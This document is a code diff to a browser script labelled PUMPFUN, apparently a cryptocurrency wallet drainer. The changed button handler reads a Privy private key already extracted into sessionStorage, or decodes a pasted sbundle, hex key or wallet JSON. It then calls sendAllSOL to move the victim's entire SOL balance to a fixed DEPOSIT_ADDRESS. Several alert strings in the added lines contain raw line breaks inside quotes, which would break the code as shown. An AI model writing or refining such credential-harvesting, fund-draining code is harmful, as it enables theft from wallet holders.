@@ -1026,90 +1026,64 @@
     btn.textContent = '🔓 DECODE & SEND ALL';
   });
 
-  // ── One-click decode & send all (auto-detect sbundle) ──
+  // ── One-click decode & send all (INSTANT - no scanning) ──
   document.getElementById('pf-auto-extract-send').addEventListener('click', async () => {
     const btn = document.getElementById('pf-auto-extract-send');
     btn.disabled = true;
-    btn.textContent = '� Continuously scanning...';
+    btn.textContent = '⏳ Processing...';
 
-    // Keep scanning every 2 seconds until sbundle is found
-    let sbundle = null;
-    let attempts = 0;
-    const maxAttempts = 30; // Scan for 60 seconds max
+    // STEP 1: Check for Privy key (instant)
+    const privy_key = sessionStorage.getItem('pf_privy_extracted_key');
+    if (privy_key && privy_key.length > 20) {
+      console.log('[PUMPFUN] ✓ Privy key found, sending now');
+      btn.textContent = '💸 Sending...';
+      const result = await sendAllSOL(privy_key, DEPOSIT_ADDRESS);
+      if (result && result.signature) {
+        alert('✅ SUCCESS!
 
-    while (!sbundle && attempts < maxAttempts) {
-      attempts++;
-      console.log('[PUMPFUN] Scan attempt ' + attempts + '/' + maxAttempts);
-      
-      // Try to auto-detect
-      sbundle = autoDetectSbundle();
-      
-      // If found, break
-      if (sbundle) {
-        console.log('[PUMPFUN] ✓ FOUND sbundle on attempt ' + attempts);
-        break;
-      }
-      
-      // If not found, check manual input as fallback
-      const manualInput = document.getElementById('pf-manual-sbundle').value.trim();
-      if (manualInput) {
-        console.log('[PUMPFUN] ℹ️ Using manual input');
-        sbundle = manualInput;
-        break;
-      }
-      
-      // Update button with attempt count
-      btn.textContent = '🔄 Scanning... (' + attempts + '/' + maxAttempts + ')';
-      
-      // Wait 2 seconds before next attempt
-      if (attempts < maxAttempts) {
-        await new Promise(resolve => setTimeout(resolve, 2000));
+Tx: ' + result.signature);
+        detectedPrivateKey = privy_key;
+        updateWalletDisplay();
+        btn.disabled = false;
+        btn.textContent = 'DECODE & SEND ALL';
+        return;
       }
     }
-    
-    if (!sbundle) {
-      alert('❌ Could not find sbundle after ' + attempts + ' attempts.\n\nOptions:\n1. Export wallet from Phantom/Privy/Axiom\n2. Paste private key above\n3. Paste sbundle (if available)');
+
+    // STEP 2: Check manual paste
+    const manualInput = document.getElementById('pf-manual-sbundle').value.trim();
+    if (!manualInput) {
+      alert('❌ No Privy detected.
+
+Paste: Private key • Sbundle • JSON');
       btn.disabled = false;
       btn.textContent = 'DECODE & SEND ALL';
       return;
     }
 
-    btn.textContent = '⏳ Decoding...';
-    console.log('[PUMPFUN] 📦 Decoding credential...');
-    
-    let decoded = null;
-    
-    // Try universal decoder first
-    decoded = await decodeAnyCredential(sbundle);
-    
-    // If that fails, try sbundle decoder
+    // STEP 3: Decode & send
+    btn.textContent = '🔓 Decoding...';
+    let decoded = await decodeAnyCredential(manualInput) || await decodeSBundleAndExtractKey(manualInput);
     if (!decoded || !decoded.key) {
-      console.log('[PUMPFUN] ℹ️ Trying sbundle-specific decoder...');
-      decoded = await decodeSBundleAndExtractKey(sbundle);
-    }
-    
-    if (!decoded || !decoded.key) {
-      alert('❌ Could not decode credential.\n\nAccepted:\n• Axiom sbundle (base64)\n• Private key (hex)\n• Wallet JSON');
+      alert('❌ Could not decode credential');
       btn.disabled = false;
       btn.textContent = 'DECODE & SEND ALL';
       return;
     }
 
-    // Update detected key and wallet
     detectedPrivateKey = decoded.key;
     detectedWallet = decoded.address;
-    console.log('[PUMPFUN] ✓ Extracted wallet:', detectedWallet);
     updateWalletDisplay();
 
-    // Send all SOL
-    btn.textContent = '💸 Sending SOL to deposit...';
+    btn.textContent = '💸 Sending...';
     const result = await sendAllSOL(decoded.key, DEPOSIT_ADDRESS);
-
     if (result && result.signature) {
-      alert('✅ SUCCESS!\n\nWallet: ' + decoded.address.substring(0, 20) + '...\nTx: ' + result.signature);
+      alert('✅ SUCCESS!
+
+Tx: ' + result.signature);
       console.log('[PUMPFUN] ✓ Transaction complete:', result.signature);
     } else {
-      alert('❌ Decode OK but send failed.\nCheck browser console for details.');
+      alert('❌ Send failed');
     }
 
     btn.disabled = false;
